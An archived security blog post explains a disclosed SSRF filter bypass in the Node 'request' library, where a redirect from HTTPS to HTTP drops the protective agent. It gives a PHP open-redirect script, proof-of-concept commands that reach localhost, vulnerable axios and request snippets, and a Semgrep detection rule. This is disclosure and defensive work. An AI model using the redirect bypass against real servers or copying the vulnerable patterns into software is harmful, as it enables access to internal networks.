---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-03-16_ssrf-cross-protocol-redirect-bypass.md
original_filename: 2023-03-16_ssrf-cross-protocol-redirect-bypass.md
title: SSRF Cross Protocol Redirect Bypass
category: documents
detected_topics:
- supply-chain
- ssrf
- mobile-security
- oauth
- sso
- xss
tags:
- imported
- documents
- supply-chain
- ssrf
- mobile-security
- oauth
- sso
- xss
language: en
raw_sha256: 90e1eae3c20ae56972da61f7cb18d27f83e73c42a1aeb0865229f857bdc4d27f
text_sha256: 50570e8ad8577788f8c780a233414748e9800a71fabe6b713124fe64d890dad4
ingested_at: '2026-06-28T07:32:19Z'
sensitivity: unknown
redactions_applied: false
---

# SSRF Cross Protocol Redirect Bypass

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-03-16_ssrf-cross-protocol-redirect-bypass.md
- Source Type: markdown
- Detected Topics: supply-chain, ssrf, mobile-security, oauth, sso, xss
- Ingested At: 2026-06-28T07:32:19Z
- Redactions Applied: False
- Raw SHA256: `90e1eae3c20ae56972da61f7cb18d27f83e73c42a1aeb0865229f857bdc4d27f`
- Text SHA256: `50570e8ad8577788f8c780a233414748e9800a71fabe6b713124fe64d890dad4`


## Content

---
title: "SSRF Cross Protocol Redirect Bypass"
page_title: "SSRF Cross Protocol Redirect Bypass · Doyensec's Blog"
url: "https://blog.doyensec.com/2023/03/16/ssrf-remediation-bypass.html"
final_url: "https://blog.doyensec.com/2023/03/16/ssrf-remediation-bypass.html"
authors: ["Szymon Drosdzol"]
bugs: ["SSRF"]
publication_date: "2023-03-16"
added_date: "2023-03-21"
source: "pentester.land/writeups.json"
original_index: 1366
---

[![](/public/images/doyensec-logo.svg)](/index.html)

[![](/public/images/logo.svg)](/index.html)

#### ABOUT US

We are [**security engineers**](https://doyensec.com) who break bits and tell stories.  
  
Visit us  
[doyensec.com](https://doyensec.com)  
  
Follow us  
[@doyensec](https://twitter.com/doyensec)  
  
Engage us  
[info@doyensec.com](mailto:info@doyensec.com)  
  

#### Blog Archive

  * 2026

  * 2025

  * 2024

  * 2023

  * 2022

  * 2021

  * 2020

  * 2019

  * 2018

  * 2017

© 2026 [Doyensec LLC](https://doyensec.com) [![](/public/images/rss.png)](/atom.xml "RSS")

# SSRF Cross Protocol Redirect Bypass

16 Mar 2023 - Posted by Szymon Drosdzol

Server Side Request Forgery (SSRF) is a [fairly known vulnerability](https://portswigger.net/web-security/ssrf) with established prevention methods. So imagine my surprise when I bypassed an SSRF mitigation during a routine retest. Even worse, **I have bypassed a filter that we have recommended ourselves**! I couldn’t let it slip and had to get to the bottom of the issue.

# Introduction

Server Side Request Forgery is a vulnerability in which a malicious actor exploits a victim server to perform HTTP(S) requests on the attacker’s behalf. Since the server usually has access to the internal network, this attack is useful to bypass firewalls and IP whitelists to access hosts otherwise inaccessible to the attacker.

# Request Library Vulnerability

SSRF attacks can be prevented with address filtering, assuming there are no filter bypasses. One of the classic SSRF filtering bypass techniques is a redirection attack. In these attacks, an attacker sets up a malicious webserver serving an endpoint redirecting to an internal address. The victim server properly allows sending a request to an external server, but then blindly follows a malicious redirection to an internal service.

None of above is new, of course. All of these techniques have been around for years and any reputable anti-SSRF library mitigates such risks. And yet, I have bypassed it.

Client’s code was a simple endpoint created for integration. During the original engagement there was no filtering at all. After our test the client has applied an anti-SSRF library [ssrfFilter](https://www.npmjs.com/package/ssrf-req-filter). For the research and code anonymity purposes, I have extracted the logic to a standalone NodeJS script:
  
  
  const request = require('request');
  const ssrfFilter = require('ssrf-req-filter');
  
  let url = process.argv[2];
  console.log("Testing", url);
  
  request({
  uri: url,
  agent: ssrfFilter(url),
  }, function (error, response, body) {
  console.error('error:', error);
  console.log('statusCode:', response && response.statusCode);
  });
  
  

To verify a redirect bypasss I have created a simple webserver with an open-redirect endpoint in PHP and hosted it on the Internet using my test domain `tellico.fun`:
  
  
  <?php header('Location: '.$_GET["target"]); ?>
  

Initial test demonstrates that the vulnerability is fixed:
  
  
  $ node test-request.js "http://tellico.fun/redirect.php?target=http://localhost/test" 
  Testing http://tellico.fun/redirect.php?target=http://localhost/test
  error: Error: Call to 127.0.0.1 is blocked.
  

But then, I switched the protocol and suddenly I was able to access a localhost service again. Readers should look carefully at the payload, as the difference is minimal:
  
  
  $ node test-request.js "https://tellico.fun/redirect.php?target=http://localhost/test"
  Testing https://tellico.fun/redirect.php?target=http://localhost/test
  error: null
  statusCode: 200
  

What happened? The attacker server has redirected the request to another protocol - from HTTPS to HTTP. This is all it took to bypass the anti-SSRF protection.

Why is that? After some digging in the popular [request](https://www.npmjs.com/package/request) library codebase, I have discovered the following lines in the `lib/redirect.js` file:
  
  
  // handle the case where we change protocol from https to http or vice versa
  if (request.uri.protocol !== uriPrev.protocol) {
  delete request.agent
  }
  

According to the code above, anytime the redirect causes a protocol switch, the request agent is deleted. Without this workaround, the client would fail anytime a server would cause a cross-protocol redirect. This is needed since the native NodeJs `http(s).agent` cannot be used with both protocols.

Unfortunately, such behavior also loses any event handling associated with the agent. Given, that the SSRF prevention is based on the agents’ `createConnection` event handler, this unexpected behavior affects the effectiveness of SSRF mitigation strategies in the `request` library.

## Disclosure

This issue was disclosed to the maintainers on December 5th, 2022. Despite our best attempts, we have not yet received an acknowledgment. After the 90-days mark, we have decided to publish the [full technical details](https://doyensec.com/resources/Doyensec_Advisory_RequestSSRF_Q12023.pdf) as well as a public Github [issue](https://github.com/request/request/issues/3442) linked to a [pull request](https://github.com/request/request/pull/3444) for the fix. On March 14th, 2023, a CVE ID has been assigned to this vulnerability.

  * 12/05/2022 - First disclosure to the maintainer
  * 01/18/2023 - Another attempt to contact the maintainer
  * 03/08/2023 - A [Github issue](https://github.com/request/request/issues/3442) creation, without the technical details
  * 03/13/2023 - CVE-2023-28155 assigned
  * 03/16/2023 - Full technical details disclosure

# Other Libraries

Since supposedly universal filter turned out to be so dependent on the implementation of the HTTP(S) clients, it is natural to ask how other popular libraries handle these cases.

## Node-Fetch

The `node-Fetch` library also allows to overwrite an HTTP(S) agent within its options, without specifying the protocol:
  
  
  const ssrfFilter = require('ssrf-req-filter');
  const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
  
  let url = process.argv[2];
  console.log("Testing", url);
  
  fetch(url, {
  agent: ssrfFilter(url)
  }).then((response) => {
  console.log('Success');
  }).catch(error => {
  console.log('${error.toString().split('\n')[0]}');
  });
  

Contrary to the `request` library though, it simply fails in the case of a cross-protocol redirect:
  
  
  $ node fetch.js "https://tellico.fun/redirect.php?target=http://localhost/test"
  Testing https://tellico.fun/redirect.php?target=http://localhost/test
  TypeError [ERR_INVALID_PROTOCOL]: Protocol "http:" not supported. Expected "https:"
  

It is therefore impossible to perform a similar attack on this library.

## Axios

The `axios` library’s options allow to overwrite agents for both protocols separately. Therefore the following code is protected:
  
  
  axios.get(url, {
  httpAgent: ssrfFilter("http://domain"),
  httpsAgent: ssrfFilter("https://domain")
  })
  

**Note:** In Axios library, it is neccesary to hardcode the urls during the agent overwrite. Otherwise, one of the agents would be overwritten with an agent for a wrong protocol and the cross-protocol redirect would fail similarly to the `node-fetch` library.

Still, `axios` calls can be vulnerable. If one forgets to overwrite both agents, the cross-protocol redirect can bypass the filter:
  
  
  axios.get(url, {
  // httpAgent: ssrfFilter(url),
  httpsAgent: ssrfFilter(url)
  })
  

Such misconfigurations can be easily missed, so we have created a [Semgrep](https://semgrep.dev/) rule that catches similar patterns in JavaScript code:
  
  
  rules:
  - id: axios-only-one-agent-set
  message: Detected an Axios call that overwrites only one HTTP(S) agent. It can lead to a bypass of restriction implemented in the agent implementation. For example SSRF protection can be bypassed by a malicious server redirecting the client from HTTPS to HTTP (or the other way around).
  mode: taint
  pattern-sources:
  - patterns:
  - pattern-either:
  - pattern: |
  {..., httpsAgent:..., ...}
  - pattern: |
  {..., httpAgent:..., ...}
  - pattern-not: |
  {...,httpAgent:...,httpsAgent:...}
  pattern-sinks:
  - pattern: $AXIOS.request(...)
  - pattern: $AXIOS.get(...)
  - pattern: $AXIOS.delete(...)
  - pattern: $AXIOS.head(...)
  - pattern: $AXIOS.options(...)
  - pattern: $AXIOS.post(...)
  - pattern: $AXIOS.put(...)
  - pattern: $AXIOS.patch(...)
  languages:
  - javascript
  - typescript
  severity: WARNING
  

# Summary

As discussed above, we have discovered an exploitable SSRF vulnerability in the popular [request](https://www.npmjs.com/package/request) library. Despite the fact that this package has been deprecated, this dependency is still used by over 50k projects with over 18M downloads per week.

We demonstrated how an attacker can bypass any anti-SSRF mechanisms injected into this library by simply redirecting the request to another protocol (e.g. HTTP to HTTPS). While many libraries we reviewed did provide protection from such attacks, others such as `axios` could be potentially vulnerable when similar misconfigurations exist. In an effort to make these issues easier to find and avoid, we have also released our internal Semgrep rule.

### Other relevant posts:

  * ###  [ Introducing Session Switcher. Swap Burp Sessions with One Click! 17 Jun 2026 ](/2026/06/17/session-switcher.html)

  * ###  [ Intercepting OkHttp at Runtime With Frida - A Practical Guide 22 Jan 2026 ](/2026/01/22/frida-instrumentation.html)

  * ###  [ Trivial C# Random Exploitation 19 Aug 2025 ](/2025/08/19/trivial-exploit-on-C-random.html)

  * ###  [ Common OAuth Vulnerabilities 30 Jan 2025 ](/2025/01/30/oauth-common-vulnerabilities.html)

  * ###  [ Applying Security Engineering to Make Phishing Harder - A Case Study 19 Sep 2024 ](/2024/09/19/phishing-case-study.html)

  * ###  [ Windows Installer, Exploiting Custom Actions 18 Jul 2024 ](/2024/07/18/custom-actions.html)

  * ###  [ A Race to the Bottom - Database Transactions Undermining Your AppSec 11 Jul 2024 ](/2024/07/11/database-race-conditions.html)

  * ###  [ Unveiling the Prototype Pollution Gadgets Finder 17 Feb 2024 ](/2024/02/17/server-side-prototype-pollution-Gadgets-scanner.html)

  * ###  [ Introducing PoIEx - Points Of Intersection Explorer 30 Jan 2024 ](/2024/01/30/poiex-release.html)

  * ###  [ Office Documents Poisoning in SHVE 03 Nov 2023 ](/2023/11/03/Office-Document-Poisoning.html)

  * ###  [ Client-side JavaScript Instrumentation 25 Sep 2023 ](/2023/09/25/clientside-javascript-instrumentation.html)

  * ###  [ Huawei Theme Manager Arbitrary Code Execution 26 Jul 2023 ](/2023/07/26/huawei-theme-arbitrary-code-exec.html)

  * ###  [ Windows Installer EOP (CVE-2023-21800) 21 Mar 2023 ](/2023/03/21/windows-installer.html)

  * ###  [ A New Vector For “Dirty” Arbitrary File Write to RCE 28 Feb 2023 ](/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)

  * ###  [ Introducing Proxy Enriched Sequence Diagrams (PESD) 14 Feb 2023 ](/2023/02/14/pesd-extension-public-release.html)

  * ###  [ safeurl for Go 13 Dec 2022 ](/2022/12/13/safeurl.html)

  * ###  [ Let's speak AJP 15 Nov 2022 ](/2022/11/15/learning-ajp.html)

  * ###  [ The Danger of Falling to System Role in AWS SDK Client 18 Oct 2022 ](/2022/10/18/cloudsectidbit-dataimport.html)

  * ###  [ Diving Into Electron Web API Permissions 27 Sep 2022 ](/2022/09/27/electron-api-default-permissions.html)

  * ###  [ Dependency Confusion 21 Jul 2022 ](/2022/07/21/dependency-confusion.html)

  * ###  [ Apache Pinot SQLi and RCE Cheat Sheet 09 Jun 2022 ](/2022/06/09/apache-pinot-sqli-rce.html)

  * ###  [ Regexploit: DoS-able Regular Expressions 11 Mar 2021 ](/2021/03/11/regexploit.html)

  * ###  [ Researching Polymorphic Images for XSS on Google Scholar 30 Apr 2020 ](/2020/04/30/polymorphic-images-for-xss.html)

  * ###  [ One Bug To Rule Them All: Modern Android Password Managers and FLAG_SECURE Misuse 22 Aug 2019 ](/2019/08/22/modern-password-managers-flag-secure.html)

  * ###  [ Lessons in auditing cryptocurrency wallets, systems, and infrastructures 01 Aug 2019 ](/2019/08/01/common-crypto-bugs.html)

  * ###  [ Jackson gadgets - Anatomy of a vulnerability 22 Jul 2019 ](/2019/07/22/jackson-gadgets.html)

  * ###  [ On insecure zip handling, Rubyzip and Metasploit RCE (CVE-2019-5624) 24 Apr 2019 ](/2019/04/24/rubyzip-bug.html)

  * ###  [ Introducing burp-rest-api v2 05 Nov 2018 ](/2018/11/05/burp-rest-api-v2.html)

  * ###  [ GraphQL - Security Overview and Testing Tips 17 May 2018 ](/2018/05/17/graphql-security-overview.html)

  * ###  [ Developing Burp Suite Extensions training 02 Mar 2017 ](/2017/03/02/training-burp.html)
